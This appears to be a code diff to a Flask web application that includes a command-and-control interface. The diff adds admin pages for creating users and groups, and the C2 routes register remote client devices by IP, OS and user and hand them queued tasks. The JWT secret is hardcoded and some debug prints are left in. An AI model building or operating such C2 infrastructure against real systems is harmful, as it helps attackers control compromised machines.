@@ -51,7 +51,7 @@ class User(db.Model):
         if getattr(self, permission):
             return getattr(self, permission)
         for group in self.groups.split(','):#Use order as priority? Assume group exists
-            currentGroup = Group.query.filter_by(name=group)[0]
+            currentGroup = Group.query.filter_by(name=group).first()
             if getattr(currentGroup, permission): return True
         return False
 
@@ -196,9 +196,11 @@ def addGroup(name:str, administrator:bool = False, change_user_passwords:bool = 
     """
     # Check if required fields are provided
     if not name: return "Group name is required"
+    print(name)
 
     # Check if the group already exists
-    group = Group.query.filter_by(name=name)
+    group = Group.query.filter_by(name=name).first()
+    print(group)
     if group: return "A group with this name already exists"
 
     # Create the new group
@@ -329,7 +331,7 @@ def clientsPage():
 @app.route('/settings')
 @flask_login.fresh_login_required
 def settingsPage():
-    return flask.render_template('settings.html')
+    return flask.render_template('settings.html', administrator = flask_login.current_user.has_permission('administrator'))
 
 @app.route('/settings/change_password', methods=['GET', 'POST'])
 @flask_login.fresh_login_required
@@ -374,13 +376,13 @@ def changePassPage():
             flask.flash('An invalid username was given', 'error')
     return flask.render_template('changePassword.html', users = users)
 
-@app.route('/settings/change_permissions')
+@app.route('/settings/admin/change_permissions')
 @flask_login.fresh_login_required
 def selectChangePermsPage():
     user = flask_login.current_user
     if not user.has_permission('change_user_permissions') and not user.has_permission('change_admin_permissions'):
         flask.flash('You do not have access to this page', 'error')
-        flask.abort(400)
+        return flask.redirect(flask.url_for('settingsPage'))
     users = []
     groups = []
     if user.has_permission('change_user_permissions') or user.has_permission('change_admin_permissions'):
@@ -400,13 +402,13 @@ def selectChangePermsPage():
     flask.session['groups'] = [g.name for g in groups]
     return flask.render_template('selectChangePermissions.html', users = flask.session['users'], groups = flask.session['groups'])
 
-@app.route('/settings/change_permissions/select', methods=['GET', 'POST'])
+@app.route('/settings/admin/change_permissions/select', methods=['GET', 'POST'])
 @flask_login.fresh_login_required
 def changePermsPage():
     user = flask_login.current_user
     if not user.has_permission('change_user_permissions') and not user.has_permission('change_admin_permissions'):
         flask.flash('You do not have access to this page', 'error')
-        flask.abort(400)
+        return flask.redirect(flask.url_for('settingsPage'))
     try:
         try:
             users = flask.request.args['users']
@@ -448,6 +450,38 @@ def changePermsPage():
         return flask.redirect(flask.url_for('changePermsPage', users=flask.request.args['users']))
     except:
         return flask.redirect(flask.url_for('changePermsPage', groups=flask.request.args['groups']))
+
+@app.route('/settings/admin/create_user', methods=['GET', 'POST'])
+@flask_login.fresh_login_required
+def createUserPage():
+    user = flask_login.current_user
+    if not user.has_permission('administrator'):
+        flask.flash('You do not have access to this page', 'error')
+        return flask.redirect(flask.url_for('settingsPage'))
+    if flask.request.method == 'POST':
+        username = flask.request.form.get('username')
+        password = flask.request.form.get('password')
+        vPassword = flask.request.form.get('vPassword')
+        if password == vPassword:
+            newUser = addAccount(username, password)
+            flask.flash(newUser, 'info')
+        else:
+            flask.flash('Passwords do not match', 'error')
+    return flask.render_template('createUser.html')
+
+@app.route('/settings/admin/create_group', methods=['GET', 'POST'])
+@flask_login.fresh_login_required
+def createGroupPage():
+    user = flask_login.current_user
+    if not user.has_permission('administrator'):
+        flask.flash('You do not have access to this page', 'error')
+        return flask.redirect(flask.url_for('settingsPage'))
+    if flask.request.method == 'POST':
+        groupName = flask.request.form.get('groupName')
+        print(groupName)
+        newGroup = addGroup(groupName)
+        flask.flash(newGroup, 'info')
+    return flask.render_template('createGroup.html')
 
 #C2 interface
 def validateC2Client(request:flask.request) -> bool:
@@ -491,7 +525,7 @@ def contactC2Page():
     """
     if not validateC2Client(flask.request): return not_found('Invalid')
     jwT = flask.request.headers['NClient-Token']
-    if not Device.query.filter_by(jwt=jwT).all():
+    if not Device.query.filter_by(jwt=jwT).first():
         token = jwt.decode(jwT, 'Noire', algorithms=["HS256"])
         uP, tP, rP = generateRandPath(), generateRandPath(), generateRandPath()
         newClient = Device(jwt=jwT, ip=token['ip'], os=token['os'], user=token['user'],
@@ -500,7 +534,7 @@ def contactC2Page():
         db.session.add(newClient)
         db.session.commit()
     else:
-        a = Device.query.filter_by(jwt=jwT).all()[0]
+        a = Device.query.filter_by(jwt=jwT).first()
         uP, tP, rP = a.uniquePath, a.taskPath, a.responsePath
     resp = flask.make_response("")
     resp.headers['NClient-Path'], resp.headers['NClient-TaskPath'], resp.headers['NClient-ResponsePath'] = uP, tP, rP
@@ -522,14 +556,14 @@ def instructReponsePages(c2ID:str, pName:str):
     if not validateC2Client(flask.request): return not_found("Invalid")
     jwT = flask.request.headers['NClient-Token']
     try:
-        gjwT = Device.query.filter_by(jwt=jwT).all()[0]
+        gjwT = Device.query.filter_by(jwt=jwT).first()
     except KeyError:
         return not_found("Skipped initialisation")#if not in the system, something is fishy
     if c2ID != gjwT.uniquePath: return not_found("Bad unique path")
     if pName != gjwT.taskPath and pName != gjwT.responsePath: return not_found("Bad type path")
     if pName == gjwT.taskPath:
         if flask.request.method != "GET": return not_found("Bad method on control path")
-        tasks = Task.query.filter_by(owner=jwT, running=False, response='NOTRUN')
+        tasks = Task.query.filter_by(owner=jwT, running=False, response='NOTRUN').all()
         if not tasks: return not_found("No tasks")
         tR = []
         for task in tasks:
